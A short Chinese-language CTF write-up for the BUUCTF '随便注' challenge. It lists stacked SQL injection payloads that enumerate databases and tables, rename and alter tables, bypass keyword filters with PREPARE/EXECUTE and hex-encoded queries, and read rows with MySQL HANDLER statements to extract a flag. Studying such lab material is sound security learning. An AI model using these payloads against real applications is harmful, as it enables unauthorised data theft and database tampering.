## 堆叠注入（buuctf随便注）
```sql
1';show databases;#
1';SHOW TABLES;#
1';DESC 表名;//查询列名
1';desc `1919810931114514`;# 

1'; show columns from 'words';#
1'; show columns from `1919810931114514`;#
	desc tableName;#


1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#


handler `1919810931114514` open as `a`;handler `a` read next;
```

```sql

"PREPARE" 是一种用于准备和执行预编译语句的命令。它通常与 "EXECUTE" 一起使用

①
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#
//字符串拼接


②
1';PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#
//select * from `1919810931114514`


③
1';Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#
//@jia是一个定义的变量


④
查看words表结构第一个字段名为`id`我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：
1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
然后通过
1' or 1 = 1 #
成功获取到flag


⑤
1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;
//mysql特有,可以逐行浏览某个表中的数据

例：

打开表：
HANDLER 表名 OPEN ;

查看数据：
HANDLER 表名 READ next;

关闭表：
HANDLER 表名 READ CLOSE;
```
